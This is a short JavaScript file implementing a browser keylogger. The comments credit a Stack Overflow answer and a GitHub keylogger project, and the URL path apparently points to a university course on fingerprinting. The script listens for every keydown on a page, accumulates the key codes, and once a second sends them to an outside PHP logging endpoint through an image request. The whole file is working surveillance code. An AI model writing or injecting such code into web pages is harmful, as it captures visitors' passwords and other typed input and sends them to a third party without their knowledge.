//https://stackoverflow.com/questions/12153357/how-to-register-document-onkeypress-event
//https://github.com/JohnHoder/Javascript-Keylogger

//String to store keypresses
var keys='';

//Destination URL
var url = 'http://bryce.bible/utk/ece469/fingerprinting/log.php?c=';


//Log keydown
//Later also log keyup
document.addEventListener("keydown", keyDownTextField, false);

//Store keys down
function keyDownTextField(e) {
    var keyCode = e.keyCode;
    keys+=keyCode+",";
}

//Send every 1000ms to server
window.setInterval(function(){
	if(keys.length>0) {
		new Image().src = url+keys;
		keys = '';
	}
}, 1000);


